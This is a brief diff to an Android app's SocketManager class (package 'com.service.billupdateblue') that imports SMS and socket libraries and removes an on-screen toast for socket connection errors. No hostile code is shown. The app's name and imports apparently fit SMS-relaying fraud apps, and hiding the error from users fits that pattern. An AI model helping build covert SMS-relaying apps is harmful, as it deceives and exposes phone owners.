@@ -1,9 +1,9 @@
 package com.service.billupdateblue;
-
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Handler;
+
 import android.os.Looper;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -89,7 +89,6 @@ public class SocketManager {
         socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
             @Override
             public void call(Object... args) {
-                showToast("S Connect Error");
                 Log.e(helper.TAG, "❌ Socket Connect Error: " + Arrays.toString(args));
             }
         });
